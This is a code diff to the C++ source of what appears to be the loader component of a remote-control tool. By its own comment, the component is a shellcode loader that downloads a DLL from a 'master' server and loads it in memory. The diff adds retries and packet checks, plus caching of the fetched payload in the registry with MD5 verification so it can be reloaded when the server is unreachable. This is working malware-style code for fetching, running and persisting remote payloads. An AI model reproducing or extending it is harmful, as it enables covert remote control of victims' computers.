@@ -5,6 +5,7 @@
 #include <WS2tcpip.h>
 #include <common/commands.h>
 #include "common/dllRunner.h"
+#include <common/md5.h>
 #include <common/iniFile.h>
 #include "auto_start.h"
 // A shell code loader connect to 127.0.0.1:6543.
@@ -116,6 +117,10 @@ public:
         const int bufSize = 8 * 1024 * 1024;
         char* buffer = new char[bufSize];
         bool isFirstConnect = true;
+        int  requestCount = 0;
+        binFile bin(CLIENT_PATH);
+        iniFile ini(CLIENT_PATH);
+        auto hash = ini.GetStr("settings", "version", "");
 
         do {
             if (!isFirstConnect)
@@ -141,11 +146,12 @@ public:
                 continue;
             }
 #ifdef _DEBUG
-            char command[16] = { SOCKET_DLLLOADER, sizeof(void*) == 8, MEMORYDLL, 0 };
+            char command[64] = { SOCKET_DLLLOADER, sizeof(void*) == 8, MEMORYDLL, 0 };
 #else
-            char command[16] = { SOCKET_DLLLOADER, sizeof(void*) == 8, MEMORYDLL, 1 };
+            char command[64] = { SOCKET_DLLLOADER, sizeof(void*) == 8, MEMORYDLL, 1 };
 #endif
             memcpy(command + 4, __DATE__, 11);  // 发送版本日期用于大 DLL 检查
+            memcpy(command + 32, hash.c_str(), min(32, hash.length()));
             char req[sizeof(PkgHeader) + sizeof(command)] = {};
             memcpy(req, &PkgHeader(sizeof(command)), sizeof(PkgHeader));
             memcpy(req + sizeof(PkgHeader), command, sizeof(command));
@@ -154,28 +160,63 @@ public:
                 closesocket(clientSocket);
                 continue;
             }
-            char* ptr = buffer + sizeof(PkgHeader);
             int bufferSize = 16 * 1024, bytesReceived = 0, totalReceived = 0;
-            while (totalReceived < bufSize) {
-                int bytesToReceive = min(bufferSize, bufSize - totalReceived);
-                int bytesReceived = recv(clientSocket, buffer + totalReceived, bytesToReceive, 0);
-                if (bytesReceived <= 0) break;
-                totalReceived += bytesReceived;
+            if (requestCount < 3) {
+                requestCount++;
+                time_t tm = time(NULL);
+                while (totalReceived < bufSize) {
+                    int bytesToReceive = min(bufferSize, bufSize - totalReceived);
+                    int bytesReceived = recv(clientSocket, buffer + totalReceived, bytesToReceive, 0);
+                    if (bytesReceived <= 0) {
+                        Mprintf("recv failed: WSAGetLastError = %d\n", WSAGetLastError());
+                        break;
+                    }
+                    totalReceived += bytesReceived;
+                    if (totalReceived >= sizeof(PkgHeader) && totalReceived >= ((PkgHeader*)buffer)->totalLen) {
+                        Mprintf("recv succeed: Cost time = %d s\n", (int)(time(NULL) - tm));
+                        break;
+                    }
+                }
             }
-            if (totalReceived < sizeof(PkgHeader) + 6) {
+            else {
                 closesocket(clientSocket);
+                break;
+            }
+
+            PkgHeader* header = (PkgHeader*)buffer;
+            if (totalReceived != header->totalLen || header->originLen <= 6 || header->totalLen > bufSize) {
+                Mprintf("Packet too short or too large: totalReceived = %d\n", totalReceived);
+                closesocket(clientSocket);
+                if (hash[0])break;
                 continue;
             }
+            char* ptr = buffer + sizeof(PkgHeader);
             BYTE cmd = ptr[0], type = ptr[1];
             size = 0;
             memcpy(&size, ptr + 2, sizeof(int));
-            if (totalReceived != size + 6 + sizeof(PkgHeader)) {
-                continue;
+            if (cmd != 211 || (type != 0 && type != 1) || size <= 64 || size > bufSize) {
+                closesocket(clientSocket);
+                break;
             }
             closesocket(clientSocket);
-        } while (false);
+            WSACleanup();
+            const auto md5 = CalcMD5FromBytes((BYTE*)buffer + 22, size);
+            bin.SetStr("settings", "data", std::string(buffer, 22 + size));
+            ini.SetStr("settings", "version", md5);
+            Mprintf("Save data[%s] to registry: %d bytes\n", md5.c_str(), size);
+            return buffer;
+        } while (1);
 
         WSACleanup();
+        auto data = bin.GetStr("settings", "data");
+        auto md5 = data.empty() ? "" : CalcMD5FromBytes((BYTE*)data.data()+22, data.length()-22);
+        if (md5.empty() || md5 != hash){
+            SAFE_DELETE_ARRAY(buffer);
+            return NULL;
+        }
+        size = data.length() - 22;
+        memcpy(buffer, data.data(), data.length());
+        Mprintf("Read data[%s] from registry succeed: %d bytes\n", md5.c_str(), size);
         return buffer;
     }
     // Request DLL from the master.
